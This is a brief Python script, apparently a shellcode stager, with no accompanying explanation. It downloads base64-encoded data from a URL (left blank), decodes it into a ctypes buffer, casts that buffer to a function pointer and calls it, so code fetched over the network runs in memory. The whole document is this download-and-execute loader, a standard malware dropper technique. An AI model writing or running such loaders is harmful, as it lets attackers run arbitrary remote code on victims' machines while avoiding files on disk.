import base64
import ctypes
import urllib.request
url = ""
response = urllib.request.urlopen(url)
shellcode = base64.b64decode(response.read())
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

shellcode_func()
